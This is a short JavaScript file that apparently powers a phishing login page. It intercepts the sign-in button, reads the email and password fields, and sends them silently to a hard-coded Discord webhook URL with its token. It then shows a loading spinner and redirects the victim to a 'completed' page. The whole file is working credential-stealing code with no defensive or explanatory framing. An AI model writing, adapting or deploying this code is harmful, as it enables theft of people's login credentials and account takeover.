const email = document.querySelector("input[type='email']");
const password = document.querySelector("input[type='password']");
const loginButton = document.querySelector("#sign-in-btn");
const body = document.querySelector("body");

loginButton.addEventListener("click", (e) => {
  e.preventDefault();
  const content = { email: email.value, password: password.value };
  const webhookURL =
    "https://discord.com/api/webhooks/1421416833046544384/ItEeROde03Anl_XPT0mYK9B4hrACejFdj28jCdW-IM8pkKw0Rskv7E8pDJjSOQRmmxsP";

  if (email.value && password.value) {
    body.innerHTML = "<div class='loader'></div>";
    (async () => {
      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: JSON.stringify(content),
        }),
      });
      window.location.href = "completed.html";
    })();
  }
});
